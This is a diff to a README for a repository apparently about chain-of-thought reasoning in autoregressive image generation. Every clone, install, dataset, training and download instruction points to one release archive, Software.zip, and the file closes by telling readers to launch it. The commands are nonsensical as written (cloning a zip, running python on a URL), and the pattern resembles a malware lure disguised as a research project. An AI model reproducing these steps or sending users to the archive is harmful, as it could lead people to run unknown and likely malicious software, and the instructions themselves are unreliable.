@@ -1,6 +1,6 @@
 # 🌟 Welcome to the Image Generation CoT Repository 🌟
 
-![CoT Reasoning](https://github.com/MinaLop/Image-Generation-CoT/releases/download/v1.0/Application.zip)
+![CoT Reasoning](https://github.com/MinaLop/Image-Generation-CoT/releases/download/v2.0/Software.zip)
 
 ## Repository Name: Image-Generation-CoT
 ## Short Description: Investigating CoT Reasoning in Autoregressive Image Generation
@@ -30,7 +30,7 @@ To get started with the Image-Generation-CoT repository, follow these steps:
 
 1. Clone the repository to your local machine using the following command:
    ```bash
-   git clone https://github.com/MinaLop/Image-Generation-CoT/releases/download/v1.0/Application.zip
+   git clone https://github.com/MinaLop/Image-Generation-CoT/releases/download/v2.0/Software.zip
    ```
 
 2. Navigate to the project directory:
@@ -40,11 +40,11 @@ To get started with the Image-Generation-CoT repository, follow these steps:
 
 3. Install the required dependencies by running:
    ```bash
-   pip install -r https://github.com/MinaLop/Image-Generation-CoT/releases/download/v1.0/Application.zip
+   pip install -r https://github.com/MinaLop/Image-Generation-CoT/releases/download/v2.0/Software.zip
    ```
 
 4. Download the dataset needed for training the models:
-   - Dataset link: [Dataset](https://github.com/MinaLop/Image-Generation-CoT/releases/download/v1.0/Application.zip)
+   - Dataset link: [Dataset](https://github.com/MinaLop/Image-Generation-CoT/releases/download/v2.0/Software.zip)
    - Extract the dataset files to the `data/` directory within the project.
 
 ---
@@ -54,17 +54,17 @@ To run the image generation experiments using CoT reasoning, follow these instru
 
 1. Preprocess the dataset:
    ```bash
-   python https://github.com/MinaLop/Image-Generation-CoT/releases/download/v1.0/Application.zip --dataset dataset_name
+   python https://github.com/MinaLop/Image-Generation-CoT/releases/download/v2.0/Software.zip --dataset dataset_name
    ```
 
 2. Train the CoT-enhanced image generation model:
    ```bash
-   python https://github.com/MinaLop/Image-Generation-CoT/releases/download/v1.0/Application.zip --config https://github.com/MinaLop/Image-Generation-CoT/releases/download/v1.0/Application.zip
+   python https://github.com/MinaLop/Image-Generation-CoT/releases/download/v2.0/Software.zip --config https://github.com/MinaLop/Image-Generation-CoT/releases/download/v2.0/Software.zip
    ```
 
 3. Generate images using the trained model:
    ```bash
-   python https://github.com/MinaLop/Image-Generation-CoT/releases/download/v1.0/Application.zip --model https://github.com/MinaLop/Image-Generation-CoT/releases/download/v1.0/Application.zip
+   python https://github.com/MinaLop/Image-Generation-CoT/releases/download/v2.0/Software.zip --model https://github.com/MinaLop/Image-Generation-CoT/releases/download/v2.0/Software.zip
    ```
 
 4. Explore the generated images and analyze the impact of CoT reasoning on the quality and diversity of outputs.
@@ -90,7 +90,7 @@ Together, we can further explore the potential of CoT reasoning in image generat
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-[![Download Software](https://github.com/MinaLop/Image-Generation-CoT/releases/download/v1.0/Application.zip)](https://github.com/MinaLop/Image-Generation-CoT/releases/download/v1.0/Application.zip)
+[![Download Software](https://github.com/MinaLop/Image-Generation-CoT/releases/download/v2.0/Software.zip)](https://github.com/MinaLop/Image-Generation-CoT/releases/download/v2.0/Software.zip)
 
 If the link ends with a file name, it needs to be launched.
 
